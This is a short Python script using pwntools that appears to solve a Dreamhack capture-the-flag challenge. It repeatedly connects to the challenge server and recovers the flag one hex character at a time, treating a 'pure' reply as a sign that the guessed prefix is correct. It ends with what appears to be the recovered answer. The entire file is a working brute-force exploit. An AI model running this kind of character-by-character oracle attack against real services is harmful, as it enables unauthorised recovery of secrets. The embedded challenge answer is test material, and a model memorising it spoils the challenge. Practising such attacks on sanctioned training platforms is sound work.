from pwn import *
import time
answer= "bdea" # 이 부분은 플래그의 일부입니다.
str1="abcdef0123456789"
while(True):
    r = remote("host8.dreamhack.games",10822)
    r.recvline()
    r.recvuntil(b'amount: ')
    r.sendline(b"1")
    for i in str1:
        tmp = answer+i
        r.recvuntil(b"input 1: ")
        r.sendline(tmp.encode())
        return_answer = r.recv(4).decode()
        time.sleep(0.1)
        if(return_answer == "pure"):
            print(answer,tmp)
            answer = tmp
            break
        r.sendline(b"y")
        time.sleep(0.1)
        r.sendline(b"1")
    if(len(answer)== 15):
        break
#1cfc993067093f49
